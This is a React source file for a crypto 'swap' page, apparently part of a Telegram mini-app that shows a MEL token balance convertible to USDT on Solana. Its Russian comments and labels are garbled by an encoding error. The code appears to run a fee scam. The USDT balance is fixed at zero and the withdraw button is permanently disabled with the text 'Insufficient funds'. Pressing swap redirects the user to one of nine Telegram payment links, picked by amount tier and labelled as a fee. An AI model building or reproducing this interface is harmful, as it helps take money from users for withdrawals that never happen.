import { Link } from "react-router-dom";
import "./Swap.css";
import React, { useState, useContext } from "react";
import UserContext from "../context/UserContext";
import melImage from "../components/DefaultCoin/photo_2024-03-28_23-01-05-transformed.png";
import usdtImage from "./c44b0a52b3c760a9934b4c47d13152c9.png";
import swapImage from "./8482621.png";

const Swap = () => {
  const { contextData } = useContext(UserContext);
  const { balance } = contextData;
  const [inputValue, setInputValue] = useState("");
  const [usdtValue, setUsdtValue] = useState("");
  const [isIconColored, setIsIconColored] = useState(false);
  const usdtBalance = 0;
  const usdt = 0.9149;
  const links = [
    "https://t.me/send?start=IVOEwneDUsCU",
    "https://t.me/send?start=IVhN43ZViQSr",
    "https://t.me/send?start=IV3vH2Fxifiz",
    "https://t.me/send?start=IVkRma723ONy",
    "https://t.me/send?start=IVLJHQedNca1",
    "https://t.me/send?start=IVSpq0FXNFLY",
    "https://t.me/send?start=IVkAtWrI1Hew",
    "https://t.me/send?start=IVOrcEdGXulS",
    "https://t.me/send?start=IVmRXsQQHWJT",
  ];
  

  // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è fee
  const calculateFee = () => {
    const value = parseFloat(inputValue);
    if (isNaN(value)) return ""; // –ï—Å–ª–∏ –∑–Ω–∞—á–µ–Ω–∏–µ –Ω–µ —á–∏—Å–ª–æ, –≤–µ—Ä–Ω—É—Ç—å –ø—É—Å—Ç—É—é —Å—Ç—Ä–æ–∫—É

    if (value >= 0 && value < 47) {
      return "‚âà 0.477-0.478";
    } else if (value >= 47 && value < 105) {
      return "‚âà 0.478-0.561";
    } else if (value >= 105 && value < 197) {
      return "‚âà 0.561-0.782";
    } else if (value >= 197 && value < 330) {
      return "‚âà 0.782-0.898";
    } else if (value >= 330 && value < 408) {
      return "‚âà 0.898-1.069";
    } else if (value >= 408 && value < 561) {
      return "‚âà 1.069-1.192";
    } else if (value >= 561 && value < 620) {
      return "‚âà 1.192-1.441";
    } else if (value >= 620 && value < 910) {
      return "‚âà 1.441-3.002";
    } else if (value >= 910) {
      return "‚âà 3.002-7.981";
    } else {
      return ""; // –î–æ–±–∞–≤—å—Ç–µ –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ —É—Å–ª–æ–≤–∏—è, –µ—Å–ª–∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ
    }
  };

  const getLinkByInputValue = () => {
    const value = parseFloat(inputValue);

    if (value >= 0 && value < 47) {
      return links[0];
    } else if (value >= 47 && value < 105) {
      return links[1];
    } else if (value >= 105 && value < 197) {
      return links[2];
    } else if (value >= 197 && value < 330) {
      return links[3];
    } else if (value >= 330 && value < 408) {
      return links[4];
    } else if (value >= 408 && value < 561) {
      return links[5];
    } else if (value >= 561 && value < 620) {
      return links[6];
    } else if (value >= 620 && value < 910) {
      return links[7];
    } else if (value >= 910) {
      return links[8];
    } else {
      return ""; // –î–æ–±–∞–≤—å—Ç–µ –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ —É—Å–ª–æ–≤–∏—è, –µ—Å–ª–∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ
    }
  };

  const fee = calculateFee();

  const handleBalanceClick = () => {
    setInputValue(balance.toFixed(6));
    const newUsdt = balance * usdt;
    setUsdtValue(newUsdt.toFixed(6));
  };

  const handleInputChange = (e) => {
    let newValue = e.target.value;
    // –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –≤–≤–æ–¥ –Ω–µ –±–æ–ª–µ–µ 6 –∑–Ω–∞–∫–æ–≤ –ø–æ—Å–ª–µ –∑–∞–ø—è—Ç–æ–π
    if (/^\d*\.?\d{0,6}$/.test(newValue)) {
      setInputValue(newValue);
      newValue = parseFloat(newValue);
      if (!isNaN(newValue)) {
        setUsdtValue((newValue * usdt).toFixed(6));
      } else {
        setUsdtValue(""); // –û—á–∏—â–∞–µ–º –≤—Ç–æ—Ä–æ–µ –ø–æ–ª–µ, –µ—Å–ª–∏ –ø–µ—Ä–≤–æ–µ –Ω–µ —è–≤–ª—è–µ—Ç—Å—è —á–∏—Å–ª–æ–º
      }
    } else if (newValue === "") {
      setInputValue("");
      setUsdtValue(""); // –û—á–∏—â–∞–µ–º –≤—Ç–æ—Ä–æ–µ –ø–æ–ª–µ, –µ—Å–ª–∏ –ø–µ—Ä–≤–æ–µ –ø—É—Å—Ç–æ–µ
    }
  };

  const handleUsdtInputChange = (e) => {
    let newValue = e.target.value;
    // –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –≤–≤–æ–¥ –Ω–µ –±–æ–ª–µ–µ 6 –∑–Ω–∞–∫–æ–≤ –ø–æ—Å–ª–µ –∑–∞–ø—è—Ç–æ–π
    if (/^\d*\.?\d{0,6}$/.test(newValue)) {
      setUsdtValue(newValue);
      newValue = parseFloat(newValue);
      if (!isNaN(newValue)) {
        setInputValue((newValue / usdt).toFixed(6));
      } else {
        setInputValue(""); // –û—á–∏—â–∞–µ–º –ø–µ—Ä–≤–æ–µ –ø–æ–ª–µ, –µ—Å–ª–∏ –≤—Ç–æ—Ä–æ–µ –Ω–µ —è–≤–ª—è–µ—Ç—Å—è —á–∏—Å–ª–æ–º
      }
    } else if (newValue === "") {
      setUsdtValue("");
      setInputValue(""); // –û—á–∏—â–∞–µ–º –ø–µ—Ä–≤–æ–µ –ø–æ–ª–µ, –µ—Å–ª–∏ –≤—Ç–æ—Ä–æ–µ –ø—É—Å—Ç–æ–µ
    }
  };

  // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏, –¥–æ–ª–∂–Ω–∞ –ª–∏ –∫–Ω–æ–ø–∫–∞ –±—ã—Ç—å –∞–∫—Ç–∏–≤–Ω–æ–π –∏–ª–∏ –Ω–µ—Ç
  const isButtonDisabled = () => {
    // –ö–Ω–æ–ø–∫–∞ –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –Ω–µ–∞–∫—Ç–∏–≤–Ω–æ–π, –µ—Å–ª–∏ –æ–¥–Ω–æ –∏–∑ –ø–æ–ª–µ–π –ø—É—Å—Ç–æ–µ –∏–ª–∏ inputValue –±–æ–ª—å—à–µ balance
    return !inputValue || parseFloat(inputValue) > balance + 0.000001;
  };

  // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Ü–≤–µ—Ç–∞ –∏–∫–æ–Ω–∫–∏ –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç —É—Å–ª–æ–≤–∏–π
  const updateIconColor = () => {
    if (isButtonDisabled()) {
      setIsIconColored(false); // –ï—Å–ª–∏ –∫–Ω–æ–ø–∫–∞ –Ω–µ–∞–∫—Ç–∏–≤–Ω–∞, –¥–µ–ª–∞–µ–º –∏–∫–æ–Ω–∫—É —Å–µ—Ä–æ–π
    } else {
      setIsIconColored(true); // –í –ø—Ä–æ—Ç–∏–≤–Ω–æ–º —Å–ª—É—á–∞–µ, –¥–µ–ª–∞–µ–º –∏–∫–æ–Ω–∫—É —Ü–≤–µ—Ç–Ω–æ–π
    }
  };

  // –í—ã–∑—ã–≤–∞–µ–º —Ñ—É–Ω–∫—Ü–∏—é –¥–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Ü–≤–µ—Ç–∞ –∏–∫–æ–Ω–∫–∏ –ø—Ä–∏ –∏–∑–º–µ–Ω–µ–Ω–∏–∏ —Å–æ—Å—Ç–æ—è–Ω–∏–π
  React.useEffect(() => {
    updateIconColor();
  }, [inputValue, balance]);

  return (
    <div className="swap-page-container">
      <div className="swap-back-button">
        <Link to="/" className="swap-back-link">
          &lt; –ù–∞–∑–∞–¥
        </Link>
      </div>
      <div className="toptext">SWAP</div>
      <div className="balance-field">
        <img src={melImage} alt="MEL icon" className="icon-mell" />
        <span>{balance.toFixed(6)}</span>
        <span>üîÑ</span>
        <span>{usdtBalance.toFixed(6)}</span>
        <img src={usdtImage} alt="USDT icon" className="icon-usdt" />
      </div>
      <div className="balance-input">
        <label htmlFor="balanceInput" className="balance-label">
          <Link to="#" className="balance-link" onClick={handleBalanceClick}>
            max {balance.toFixed(2)} mell
          </Link>
        </label>
        <input
          type="text"
          id="balanceInput"
          placeholder="0"
          className="balance-in"
          value={inputValue}
          onChange={handleInputChange}
        />
      </div>
      <img
        src={swapImage}
        alt="Refresh Icon"
        className="refresh-icon"
        style={{ filter: isIconColored ? "none" : "grayscale(100%)" }}
        onClick={() => {
          if (!isButtonDisabled()) {
            // –ï—Å–ª–∏ –∫–Ω–æ–ø–∫–∞ –∞–∫—Ç–∏–≤–Ω–∞, –º–æ–∂–Ω–æ –≤—ã–ø–æ–ª–Ω–∏—Ç—å –¥–µ–π—Å—Ç–≤–∏–µ
            // –í –¥–∞–Ω–Ω–æ–º —Å–ª—É—á–∞–µ, –ø–µ—Ä–µ—Ö–æ–¥ –ø–æ —Å—Å—ã–ª–∫–µ
            const link = getLinkByInputValue();
            if (link) {
              window.location.href = link;
            }
          }
        }}
      />

      <div className="usdt-input">
        <label htmlFor="usdtInput" className="balance-label">
          fee {fee}
        </label>
        <input
          type="text"
          id="usdtInput"
          placeholder="0"
          className="usdt-in"
          value={usdtValue}
          onChange={handleUsdtInputChange}
        />
      </div>
      <div className="overtext">
        <p>
          <span className="overtext-left">–í–∞–ª—é—Ç–∞:</span>
          <span className="overtext-right">Tether</span>
        </p>
        <p>
          <span className="overtext-left">–°–µ—Ç—å:</span>
          <span className="overtext-right">Solana</span>
        </p>
        <p>
          <span className="overtext-left">–ú–∏–Ω. —Å—É–º–º–∞ –≤—ã–≤–æ–¥–∞:</span>
          <span className="overtext-right">0.3 USDT</span>
        </p>
      </div>

      <div class="area">
        <textarea
          id="areaInput"
          placeholder="–í–≤–µ–¥–∏—Ç–µ –∞–¥—Ä–µ—Å –¥–ª—è –≤—ã–≤–æ–¥–∞"
          class="area-in"
        ></textarea>
        <button id="submitButton" disabled>
          Insufficient funds
        </button>
      </div>

      <div className="infotext">
        <p>
          *–ù–µ –≤—ã–≤–æ–¥–∏—Ç–µ —Å—Ä–µ–¥—Å—Ç–≤–∞ –Ω–∞–ø—Ä—è–º—É—é –Ω–∞ –∫—Ä–∞—É–¥—Ñ–∞–Ω–¥–∏–Ω–≥–æ–≤—É—é –ø–ª–∞—Ç—Ñ–æ—Ä–º—É –∏–ª–∏ ICO.
          –ú—ã –Ω–µ —Å–º–æ–∂–µ–º –Ω–∞—á–∏—Å–ª–∏—Ç—å –Ω–∞ –≤–∞—à —Å—á–µ—Ç —Ç–æ–∫–µ–Ω—ã –æ—Ç —ç—Ç–æ–π –ø—Ä–æ–¥–∞–∂–∏.
        </p>
        <p>
          *–£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ –≤—ã –≤–≤–µ–ª–∏ –ø—Ä–∞–≤–∏–ª—å–Ω—ã–π –∞–¥—Ä–µ—Å –¥–ª—è –≤—ã–≤–æ–¥–∞ –≤ USDT —Å–µ—Ç–∏
          Solana. –í –ø—Ä–æ—Ç–∏–≤–Ω–æ–º —Å–ª—É—á–∞–µ —Å—Ä–µ–¥—Å—Ç–≤–∞ –º–æ–≥—É—Ç –±—ã—Ç—å —É—Ç–µ—Ä—è–Ω—ã.
        </p>
      </div>
    </div>
  );
};

export default Swap;
